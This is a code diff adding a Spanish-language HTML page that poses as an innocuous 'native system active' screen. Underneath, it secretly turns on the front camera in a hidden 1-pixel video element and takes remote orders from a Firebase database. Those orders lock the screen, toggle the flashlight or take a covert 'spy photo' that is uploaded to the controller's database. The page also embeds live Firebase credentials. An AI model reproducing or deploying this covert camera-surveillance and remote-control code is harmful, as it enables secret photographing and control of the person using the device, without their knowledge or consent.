@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body { background: #000; color: #00ff41; font-family: monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
+        #bloqueo { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; color: red; z-index: 99; flex-direction: column; justify-content: center; align-items: center; }
+        video { position: absolute; width: 1px; height: 1px; opacity: 0; } /* Cámara oculta */
+    </style>
+</head>
+<body>
+    <video id="video" autoplay playsinline></video>
+    <div id="bloqueo"><h1>⚠️ ACCESO RESTRINGIDO</h1></div>
+    <div><div style="width: 10px; height: 10px; background: #00ff41; border-radius: 50%; margin: 10px auto; box-shadow: 0 0 10px #00ff41;"></div><p>SISTEMA NATIVO ACTIVO</p></div>
+
+    <script src="https://www.gstatic.com/firebasejs/9.17.1/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.17.1/firebase-database-compat.js"></script>
+
+    <script>
+        const config = {
+            apiKey: "AIzaSyDqn4lY53EgUav_qbIO-lpypGzifnm824s",
+            authDomain: "micontrol-30a70.firebaseapp.com",
+            projectId: "micontrol-30a70",
+            databaseURL: "https://micontrol-30a70-default-rtdb.firebaseio.com",
+            storageBucket: "micontrol-30a70.firebasestorage.app",
+            messagingSenderId: "261053957770",
+            appId: "1:261053957770:web:ff6c75ec953442c003cf73"
+        };
+        firebase.initializeApp(config);
+        const db = firebase.database();
+        let streamGlobal = null;
+
+        // Iniciar cámara automáticamente para estar listo
+        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
+            .then(s => { streamGlobal = s; document.getElementById('video').srcObject = s; });
+
+        db.ref('ordenes').on('value', (snap) => {
+            const data = snap.val();
+            if (!data) return;
+
+            // Bloqueo
+            document.getElementById('bloqueo').style.display = (data.accion === 'bloqueo') ? 'flex' : 'none';
+
+            // Linterna (Solo funciona en Android con la cámara trasera)
+            if (data.accion === 'flash_on' || data.accion === 'flash_off') {
+                const track = streamGlobal.getVideoTracks()[0];
+                track.applyConstraints({ advanced: [{ torch: data.accion === 'flash_on' }] });
+            }
+
+            // Foto Espía
+            if (data.accion === 'foto') {
+                const canvas = document.createElement('canvas');
+                const video = document.getElementById('video');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                db.ref('captura_real').set({ image: canvas.toDataURL('image/jpeg'), time: Date.now() });
+                db.ref('ordenes/accion').set('esperando');
+            }
+        });
+    </script>
+</body>
+</html>
